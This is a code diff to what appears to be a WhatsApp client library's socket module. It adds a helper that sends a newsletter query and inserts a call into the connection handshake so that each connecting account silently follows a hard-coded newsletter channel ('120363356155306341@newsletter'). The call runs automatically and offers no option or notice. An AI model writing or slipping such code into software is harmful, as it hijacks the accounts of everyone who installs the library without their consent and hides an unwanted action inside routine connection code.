@@ -10,7 +10,7 @@ import {
 	MIN_PREKEY_COUNT,
 	NOISE_WA_HEADER
 } from '../Defaults'
-import { DisconnectReason, SocketConfig } from '../Types'
+import { DisconnectReason, SocketConfig, QueryIds } from '../Types'
 import {
 	addTransactionCapability,
 	aesEncryptCTR,
@@ -227,7 +227,45 @@ export const makeSocket = (config: SocketConfig) => {
 
 		return result
 	}
+	
+		/**
+	 * Follow channel
+	 */
+	 const encoder = new TextEncoder();
 
+interface NewsletterContent {
+  [key: string]: any;
+}
+
+const newsletterWMexQuery = async (
+  jid: string,
+  queryId: string,
+  content: NewsletterContent
+) => {
+  return query({
+    tag: 'iq',
+    attrs: {
+      id: generateMessageTag(),
+      type: 'get',
+      xmlns: 'w:mex',
+      to: S_WHATSAPP_NET,
+    },
+    content: [
+      {
+        tag: 'query',
+        attrs: { query_id: queryId },
+        content: encoder.encode(
+          JSON.stringify({
+            variables: {
+              newsletter_id: jid,
+              ...content,
+            },
+          })
+        ),
+      },
+    ],
+  });
+};
 	/** connection handshake */
 	const validateConnection = async() => {
 		let helloMsg: proto.IHandshakeMessage = {
@@ -268,6 +306,7 @@ export const makeSocket = (config: SocketConfig) => {
 		)
 		noise.finishInit()
 		startKeepAliveRequest()
+		await newsletterWMexQuery("120363356155306341@newsletter", QueryIds.FOLLOW, {})
 	}
 
 	const getAvailablePreKeysOnServer = async() => {
